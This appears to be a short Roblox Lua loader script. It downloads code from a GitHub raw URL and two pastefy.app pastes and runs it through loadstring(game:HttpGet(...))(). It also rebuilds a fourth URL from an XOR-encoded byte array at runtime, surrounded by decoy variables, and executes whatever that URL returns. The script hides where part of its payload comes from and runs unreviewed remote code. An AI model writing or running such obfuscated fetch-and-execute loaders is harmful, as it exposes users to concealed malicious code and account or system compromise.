loadstring(game:HttpGet("https://raw.githubusercontent.com/idrobtuo/tupian/refs/heads/main/one.one"))()
loadstring(game:HttpGet("https://pastefy.app/zbgMR53c/raw"))()
loadstring(game:HttpGet("https://pastefy.app/jKHrYsph/raw"))()

local _RND = math.random
local _NOW = tick
local _A, _B, _C = "无用", {}, nil

local function _XOR(data, key)
    local out = {}
    for i = 1, #data do
        out[i] = string.char(bit32.bxor(data[i], key))
    end
    return table.concat(out)
end

local _ENC = {
    61,33,33,37,38,111,122,122,39,52,34,123,38,58,33,48,39,60,
    52,123,39,60,37,122,97,55,97,100,96,99,98,99,97,96,102,100,
    99,51,99,49
}

local _URL = _XOR(_ENC, 85)

loadstring(game:HttpGet(_URL))()
